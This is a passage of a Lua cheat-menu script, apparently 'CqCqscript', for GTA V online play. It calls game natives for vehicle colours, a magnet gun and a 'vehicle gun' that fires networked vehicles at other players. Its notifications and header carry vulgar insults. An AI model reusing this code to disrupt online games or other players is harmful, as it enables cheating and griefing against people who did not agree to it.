--从前从前制--
--分享使用请标明出处 否则无妈！！！
--未经允许私自改本改名者更无妈！！！
--要是想当个孤儿就当我没说！！！
--Dog白又看你爹脚本呢？？？
--⠀⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝
--⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇
--⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀
--⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀
--⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀
--⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀
--⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀
--===========================================================================================================================v10.7.0(此脚本纯免费，任何收费的都是无妈仔)
--祝各位兄弟玩的开心！！！
util.require_natives(1651208000)
require "lib.cqcqlib.natives"
require "lib.cqcqlib.cqcqlib"
require "lib.cqcqlib.natives1622613546"
util.toast("欢迎加q群198651882交流！")
util.require_natives(1627063482)
util.require_natives(1640181023)
util.require_natives(1660775568)
util.keep_running()
JSkey = require 'lib.JSkeyLib'
local scaleForm = require'lib.ScaleformLib'
local SFasd = scaleForm('instructional_buttons')
local aalib = require("aalib")
local OpenMusic = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000
local TIANXIA = "///丨*CqCqscript*丨///"
store_dir = filesystem.store_dir() .. '\\CqCqScript\\'
lyrics_dir = store_dir .. '\\lyrics\\'
--[[resources_dir = filesystem.resources_dir() .. '\\cqcqmusic\\'
if not filesystem.is_dir(resources_dir) then
    notify("你安装的太NO了，重新安装！！！.")
end]]
--OpenMusic(resources_dir .. "\\ikun.wav", SND_FILENAME | SND_ASYNC)

if not filesystem.exists(settings_filepath) then
    local filehandle = io.open(settings_filepath, "w")
    if filehandle then
        filehandle:write("hide_name_on_script_startup=false\n")
        filehandle:close()
    end
end
if SCRIPT_MANUAL_START then
	gShowingIntro = true
	local state = 0
	local sTime = cTime()

	AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "clown_die_wrapper", PLAYER.PLAYER_PED_ID(), "BARRY_02_SOUNDSET", true, 20)

util.create_tick_handler(function()	
		local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")	
		while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
			util.yield()
		end
		
		HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
		if state == 0 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "Hello", "$font2", "HUD_COLOUR_RED")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_PINK")

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Pre_Screen_Stinger", PLAYER.PLAYER_PED_ID(), "DLC_HEISTS_FINALE_SCREEN_SOUNDS", true, 20)
			state = 1
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 1 then
			HIDE(scaleform)
			state = 2
			sTime = cTime()
		end

		if cTime() - sTime >= 3000 and state == 2 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "CqCq script", "$font2", "HUD_COLOUR_ORANGE")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, 'v' .. Version, "$font5", "HUD_COLOUR_GREEN")
			
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.PLAYER_PED_ID(), "BARRY_01_SOUNDSET", true, 20)
			state = 3
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 3 then
			HIDE(scaleform)
			state = 4
			sTime = cTime()
		end
		if cTime() - sTime >= 3000 and state == 4 then
			gShowingIntro = false
			return false
		end

		GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
		return true
	end)

end

C_C_VEHICLE={
    ["_SET_VEHICLE_INTERIOR_COLOR"]=function(as,js)a()d(as)d(js)b("F40DD601A65F7F19")end,
    ["SET_VEHICLE_NEON_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(r)native_invoker.push_arg_int(g)native_invoker.push_arg_int(b)native_invoker.end_call_2(0x8E0A582209A62695)end,
    ["SET_VEHICLE_NEON_ENABLED"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] index,--[[BOOL (bool)]] toggle)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(index)native_invoker.push_arg_bool(toggle)native_invoker.end_call_2(0x2AA720E4287BF269)end,
    ["SET_VEHICLE_CUSTOM_PRIMARY_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(r);native_invoker.push_arg_int(g);native_invoker.push_arg_int(b);native_invoker.end_call("7141766F91D15BEA");end,
    ["SET_VEHICLE_CUSTOM_SECONDARY_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(r)native_invoker.push_arg_int(g)native_invoker.push_arg_int(b)native_invoker.end_call_2(0x36CED73BFED89754)end,
    ["TOGGLE_VEHICLE_MOD"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] modType,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(modType);native_invoker.push_arg_bool(toggle);native_invoker.end_call("2A1F4F37F95BAD08");end,
    ["SET_VEHICLE_NEON_INDEX_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] index)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(index)native_invoker.end_call_2(0xB93B2867F7B479D1)end,
    ["SET_VEHICLE_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] colorPrimary,--[[int]] colorSecondary)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(colorPrimary)native_invoker.push_arg_int(colorSecondary)native_invoker.end_call_2(0x4F1D4BE3A7F24601)end,
    ["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,
    ["SET_VEHICLE_EXTRA_COLOUR_5"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] color)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(color)native_invoker.end_call_2(0xF40DD601A65F7F19)end,
    ["SET_VEHICLE_XENON_LIGHT_COLOR_INDEX"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] colorIndex)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(colorIndex)native_invoker.end_call_2(0xE41033B25D003A07)end,
}
C_VEHICLE={
    ["_SET_VEHICLE_INTERIOR_COLOR"]=function(as,js)a()d(as)d(js)b("F40DD601A65F7F19")end,
    ["SET_VEHICLE_NEON_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(r)native_invoker.push_arg_int(g)native_invoker.push_arg_int(b)native_invoker.end_call_2(0x8E0A582209A62695)end,
    ["SET_VEHICLE_NEON_ENABLED"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] index,--[[BOOL (bool)]] toggle)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(index)native_invoker.push_arg_bool(toggle)native_invoker.end_call_2(0x2AA720E4287BF269)end,
    ["SET_VEHICLE_CUSTOM_PRIMARY_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(r);native_invoker.push_arg_int(g);native_invoker.push_arg_int(b);native_invoker.end_call("7141766F91D15BEA");end,
    ["SET_VEHICLE_CUSTOM_SECONDARY_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] r,--[[int]] g,--[[int]] b)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(r)native_invoker.push_arg_int(g)native_invoker.push_arg_int(b)native_invoker.end_call_2(0x36CED73BFED89754)end,
    ["TOGGLE_VEHICLE_MOD"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] modType,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(modType);native_invoker.push_arg_bool(toggle);native_invoker.end_call("2A1F4F37F95BAD08");end,
    ["SET_VEHICLE_NEON_INDEX_COLOUR"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] index)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(index)native_invoker.end_call_2(0xB93B2867F7B479D1)end,
    ["SET_VEHICLE_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] colorPrimary,--[[int]] colorSecondary)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(colorPrimary)native_invoker.push_arg_int(colorSecondary)native_invoker.end_call_2(0x4F1D4BE3A7F24601)end,
    ["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,
    ["SET_VEHICLE_EXTRA_COLOUR_5"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] color)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(color)native_invoker.end_call_2(0xF40DD601A65F7F19)end,
    ["SET_VEHICLE_XENON_LIGHT_COLOR_INDEX"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] colorIndex)native_invoker.begin_call()native_invoker.push_arg_int(vehicle)native_invoker.push_arg_int(colorIndex)native_invoker.end_call_2(0xE41033B25D003A07)end,
    

}
C_HUD={
	["_THEFEED_SET_NEXT_POST_BACKGROUND_COLOR"]=--[[void]] function(--[[int]] hudColorIndex)native_invoker.begin_call();native_invoker.push_arg_int(hudColorIndex);native_invoker.end_call("92F0DA1E27DB96DC");end,
}
C_CCHUD={
    ["GET_WARNING_SCREEN_MESSAGE_HASH"]=--[[Hash (int)]] function()native_invoker.begin_call()native_invoker.end_call_2(0x81DF9ABA6C83DFF9)return native_invoker.get_return_value_int()end,

}
CC_GRAPHICS={
["START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE"]=--[[BOOL (bool)]] function(--[[string]] effectName,--[[Entity (int)]] entity,--[[float]] offsetX,--[[float]] offsetY,--[[float]] offsetZ,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] boneIndex,--[[float]] scale,--[[BOOL (bool)]] axisX,--[[BOOL (bool)]] axisY,--[[BOOL (bool)]] axisZ)native_invoker.begin_call()native_invoker.push_arg_string(effectName)native_invoker.push_arg_int(entity)native_invoker.push_arg_float(offsetX)native_invoker.push_arg_float(offsetY)native_invoker.push_arg_float(offsetZ)native_invoker.push_arg_float(rotX)native_invoker.push_arg_float(rotY)native_invoker.push_arg_float(rotZ)native_invoker.push_arg_int(boneIndex)native_invoker.push_arg_float(scale)native_invoker.push_arg_bool(axisX)native_invoker.push_arg_bool(axisY)native_invoker.push_arg_bool(axisZ)native_invoker.end_call_2(0x02B1F2A72E0F5325)return native_invoker.get_return_value_bool()end,

}
CC_PAD={
["GET_CONTROL_GROUP_INSTRUCTIONAL_BUTTONS_STRING"]=--[[string]] function(--[[int]] padIndex,--[[int]] controlGroup,--[[BOOL (bool)]] p2)native_invoker.begin_call()native_invoker.push_arg_int(padIndex)native_invoker.push_arg_int(controlGroup)native_invoker.push_arg_bool(p2)native_invoker.end_call_2(0x80C2FD58D720C801)return native_invoker.get_return_value_string()end,

}
CCCC_HUD={
    ["_HUD_WEAPON_WHEEL_GET_SELECTED_HASH"]=--[[Hash (int)]] function()native_invoker.begin_call();native_invoker.end_call("A48931185F0536FE");return native_invoker.get_return_value_int();end,



}
CQ_MISC={
    ["_RESTART_GAME"]=function(...)return native_invoker.uno_void(0xE574A662ACAEFBB1,...)end,


}

MISC.FORCE_LIGHTNING_FLASH()
local srgb = {cus = 100}
function requestweapon(...)
	local arg = {...}
	for _, model in ipairs(arg) do
		WEAPON.REQUEST_WEAPON_ASSET(model, 31, 26)
		while not WEAPON.HAS_WEAPON_ASSET_LOADED(model) do
			util.yield()
		end
	end
end
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        C_C_VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
local rgb = {cus = 100}
function zjbs()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        C_C_VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        C_C_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        C_C_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb.cus)
       end
    end
    function qzd()
        local color = {
            {64, 1},
            {73, 2},
            {51, 3}, 
            {92, 4}, 
            {89, 5}, 
            {88, 6}, 
            {38, 7}, 
            {39 , 8}, 
            {137, 9}, 
            {135, 10}, 
            {145, 11},
            {142, 12} 
          }
         if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
          local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
          RGBNeonKit(players.user_ped())
          local rcolor = math.random(1, 12)
          C_C_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
          C_C_VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
          util.yield(srgb.cus)
        end
    end
    local Openscript = "CqCqscript 启动！"
function notification(message, color)
    C_HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
    local picture = "CHAR_SOCIAL_CLUB"
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
        util.yield()
    end
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
    title = "&#8721;CqCq温馨提示"
    if color == colors.black or color == colors.green then
        subtitle = "看这里操你妈的"
    elseif color == colors.black then
        subtitle = "看这里操你妈的"
    else
        subtitle = "看这里操你妈的"
    end
    HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
    util.log(message)
end
local notification = b_notifications.new()
notification.notify("Hello","欢迎使用CqCqscript！Have fun！！！")
local festive_div = menu.divider(menu.my_root(), "*运行CqCqscript*", {}, "")
local loading_frames = {'!=', '=!=', '===-!', '===-=!', '==-!-==', '!=-===', '!-===', '=!=','=!'}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        menu.set_menu_name(festive_div, frame .. ' ' .. TIANXIA .. ' ' .. frame)
        util.yield(100)
    end
end)
local self = menu.list(menu.my_root(), "自我选项", {}, "想要白嫖吗？？那就点进来吧！！") 
local online = menu.list(menu.my_root(), "在线选项", {}, "在线功能选项") 
local vehicle = menu.list(menu.my_root(), "载具选项", {}, "载具功能选项")
local all = menu.list(menu.my_root(), "全局选项", {}, "全局功能选项") 
local chuansong = menu.list(menu.my_root(), "传送选项", {}, "传送功能选项")
local world = menu.list(menu.my_root(), "世界选项", {}, "世界功能选项")
local funfeatures = menu.list(menu.my_root(), "娱乐选项", {}, "娱乐功能")
local mod111 = menu.list(menu.my_root(), "模组选项", {}, "刷一些模组")
local renwuxx = menu.list(menu.my_root(), "任务选项", {}, "任务专属")
local constructorscript00 = menu.list(menu.my_root(), "人物模型", {}, "模型功能选项")
Undefined = menu.list(menu.my_root(), "第二菜单", {}, "加载CqCqscript2.0", function(); end) 
Fight_script = menu.list(menu.my_root(), "战斗菜单", {}, "加载CqCqscript3.0", function(); end) 
local qita = menu.list(menu.my_root(), "其他选项", {}, "其他")
local zalei = menu.list(menu.my_root(), "问答选项", {}, "杂类")
local misc = menu.list(qita, "群选项", {}, "官方群聊")
local other = menu.list(qita, "鸣谢", {}, "鸣谢人员")
local zanzhu = menu.list(qita, "赞助人员", {}, "谢谢老板支持！！老板发财！！")
local save_loadout = qita:action("快捷保存武器", {}, "保存所有当前装备的武器及其附件，以便将来装载", function()
    baocunwq()
end)
load_loadout = qita:action("快捷加载保存的武器", {"loadloadout"}, "装备上次保存的每一件武器", function()
    jiazaiwq()
end)
from_scratch = qita:action("快捷删除保存的武器", {}, "删除你当前的武器，这样你就可以按照你想要的方式构建你的装备",function()
    congtouks()
end)
menu.divider(chuansong, "传送选项")
menu.action(chuansong,"传送面板[呼出虎鲸]", {"hctpsub"}, "", function()
    cshj()
end)
menu.hyperlink(misc, "加入脚本中文交流", "https://jq.qq.com/?_wv=1027&k=YneNsXUT")
menu.action(misc, "欢迎加入", {}, "欢迎加入中文交流群！", function()
    util.toast("快进来！别不知好歹！！")
end)
menu.divider(other, "制作人员")
menu.action(other, "CqCq", {}, "Creator of this script\n官方群198651882，欢迎大家进来交流！", function()
    util.toast("没错，就是我这个大帅逼 :)")
    end)
menu.divider(other, "测试人员")
            menu.action(other, "wish", {}, "版本测试人员:)\n官方群198651882，欢迎大家进来交流！", function()
                util.toast("没错，就是我这个大帅逼 :)")
                end)

menu.divider(other, "CqCqScript v10.6.2策划更新")
menu.action(other, "夜幕工作室", {}, "", function()
    end)
    menu.divider(other, "致谢")
    menu.action(other, "HEEZY", {}, "THANKS", function()
    end)
    menu.action(other, "夜幕", {}, "THANKS", function()
    end)
    menu.divider(other, "脚本翻译")
    menu.action(other, "顶真", {}, "部分脚本翻译人员", function()
    end)
    --=============THANKS==============
    menu.divider(zanzhu, "赞助人员")
    menu.toggle_loop(zanzhu, "赞助人员总列表", {"Richman"}, "谢谢老板们!!!", function()
        draw_string(string.format("~italic~~bold~~r~1.Memoir"), 0.931,0, 0.25,5)--===x-===y-===大小-===
        draw_string(string.format("~italic~~bold~~y~2.没睡醒"), 0.967,0.015,0.25,5)
        draw_string(string.format("~italic~~bold~~g~3.Wish"), 0.931,0.030,0.25,5)
        draw_string(string.format("~italic~~bold~~p~4.KL"), 0.967,0.045,0.25,5)
        draw_string(string.format("~italic~~bold~~o~5.沙耶"), 0.931,0.060,0.25,5)
end)
    menu.action(zanzhu, "Memoir", {}, "谢谢老板！！!", function()
    end)
    menu.action(zanzhu, "没睡醒", {}, "谢谢老板！！!", function()
    end)
    menu.action(zanzhu, "Wish", {}, "谢谢老板！！!", function()
    end)
    menu.action(zanzhu, "KLasombra", {}, "谢谢老板！！!", function()
    end)
    menu.action(zanzhu, "沙耶", {}, "谢谢老板！！!", function()
    end)
    --====================
    local insinst = "FocusIn"
    zhuti = menu.list(qita,"主题变色", {},"主题变色")
    zhutibianse = menu.action(zhuti, "加载主题选项", {""}, "", function()
        notification("正在加载主题选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.Pulsive"
        menu.delete(zhutibianse)
    end)
menu.divider(self, "自我选项")
ziwowuqi = menu.list(self, "自我武器", {}, "", function(); end)--========by wiri---thanks
ciligun1 = menu.list(ziwowuqi, "磁力枪", {}, "", function(); end)
menu.toggle_loop(ciligun1, "磁力枪", {"magnetgun"}, "具有磁力的枪，可控制车辆去向（需先设置模式）", function ()
    ciliqiang()
end)
menu.slider_text(ciligun1, "设置磁力枪", {}, "", {"平滑模式", "混沌模式"}, function(index)
	szclq(index)
end)
---@class Preview
Preview = {handle = 0, modelHash = 0}
Preview.__index = Preview

---@param modelHash Hash
---@return Preview
function Preview.new(modelHash)
	local self = setmetatable({}, Preview)
	self.modelHash = modelHash
	return self
end

---@param pos v3
function Preview:create(pos, heading)
	if self:exists() then return end
	self.handle = VEHICLE.CREATE_VEHICLE(self.modelHash, pos.x, pos.y, pos.z, heading, false, false, false)
	ENTITY.SET_ENTITY_ALPHA(self.handle, 153, true)
	ENTITY.SET_ENTITY_COLLISION(self.handle, false, false)
	ENTITY.SET_CAN_CLIMB_ON_ENTITY(self.handle, false)
end

---@param rot v3
function Preview:setRotation(rot)
	ENTITY.SET_ENTITY_ROTATION(self.handle, rot.x, rot.y, rot.z, 0, true)
end

---@param pos v3
function Preview:setCoords(pos)
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self.handle, pos.x, pos.y, pos.z, false, false, false)
end

function Preview:destroy()
	entities.delete_by_handle(self.handle)
	self.handle = 0
end

function Preview:setOnGround()
	VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(self.handle, 1.0)
end

---@return boolean
function Preview:exists()
	return self.handle ~= 0 and ENTITY.DOES_ENTITY_EXIST(self.handle)
end

local vehicles <const> =
{
	"adder",
	"lazer",
	"insurgent2",
	"phantom2",
}
local modelHash = util.joaat("adder")
local preview <const> = Preview.new(modelHash)
local setIntoVehicle = false
local maxDist <const> = 100.0
local minDist <const> = 15.0
local distancePerc = 0.0
local currentDistance = minDist
local lastInput <const> = newTimer()
local vehicleGun <const> = menu.list(ziwowuqi,"车辆枪", {}, "")

---@return number
function get_veh_distance()
	if PAD.IS_CONTROL_JUST_PRESSED(2, 241) and distancePerc < 1.0 then
		distancePerc = distancePerc + 0.25
		lastInput.reset()

	elseif PAD.IS_CONTROL_JUST_PRESSED(2, 242) and distancePerc > 0.0 then
		distancePerc = distancePerc - 0.25
		lastInput.reset()
	end
	local distance = interpolate(minDist, maxDist, distancePerc)
	local duration <const> = 200 -- `ms`
	if currentDistance ~= distance and lastInput.elapsed() <= duration then
		currentDistance = interpolate(currentDistance, distance, lastInput.elapsed() / duration)
	end
	return currentDistance
end

local Cargun = "车枪"
menu.toggle_loop(vehicleGun,Cargun, {}, "", function ()
	request_model(modelHash)
	local camRot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	local distance = get_veh_distance()
	local raycast = get_raycast_result(distance + 5.0, TraceFlag.world)
	local coords = raycast.didHit and raycast.endCoords or get_offset_from_cam(distance)

	if not Config.general.disablepreview and
	PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
		if not preview:exists() then
			preview.modelHash = modelHash
			preview:create(coords, camRot.z)
		else
			preview:setCoords(coords)
			preview:setRotation(camRot)
			if raycast.didHit then preview:setOnGround() end
		end

		if Instructional:begin() then
			Instructional.add_control_group(29, "FM_AE_SORT_2")
			Instructional:set_background_colour(0, 0, 0, 80)
			Instructional:draw()
		end
	elseif preview:exists() then preview:destroy() end

	if PED.IS_PED_SHOOTING(players.user_ped()) then
		local veh = VEHICLE.CREATE_VEHICLE(modelHash, coords.x, coords.y, coords.z, camRot.z, true, true, false)
		NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(veh), true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, coords.x, coords.y, coords.z, false, false, false)
		ENTITY.SET_ENTITY_ROTATION(veh, camRot.x, camRot.y, camRot.z, 0, true)
		VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 200.0)
		if not setIntoVehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 2)
		else
			VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, true)
			PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
		end
	end
end, function()
	if preview:exists() then preview:destroy() end
end)
---@param index integer
---@param name string
function Instructional.add_control_group (index, name)
	local button = CC_PAD.GET_CONTROL_GROUP_INSTRUCTIONAL_BUTTONS_STRING(2, index, true)
    Instructional:add_data_slot(index, name, button)
end

local options_all <const> =  {{"灵蛇"}, {"天煞"}, {"叛乱分子"}, {"尖锥魅影"}}
local setshoot_other = "设置车枪"
menu.list_select(vehicleGun,setshoot_other, {}, "", options_all, 1, function (opt)
	local vehicle = vehicles[opt]
	modelHash = util.joaat(vehicle)
end)

local Csound = "HintCamSounds"
local errmsg = "您输入的车辆英文名不正确 !"
local other_car = "其他车辆"
menu.text_input(vehicleGun,other_car, {"customvehgun"}, "", function(vehicle, click)
	if (click & CLICK_FLAG_AUTO) ~= 0 then
		return
	end
	if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(vehicle)) then
		modelHash = util.joaat(vehicle)
	else notification:help(errmsg, HudColour.red) end
end)
local Entercar = "进入车辆"
menu.toggle(vehicleGun,Entercar, {}, "", function(toggle)
	setIntoVehicle = toggle
end)
shejiqiangkou = menu.list(ziwowuqi, "枪口色", {}, "", function(); end)
---@class ShootEffect: Effect
local ShootEffect =
{
	scale = 0,
	---@type v3
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)

function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end

local selectedOpt = 1
---@type ShootEffect[]
local shootingEffects <const> = {
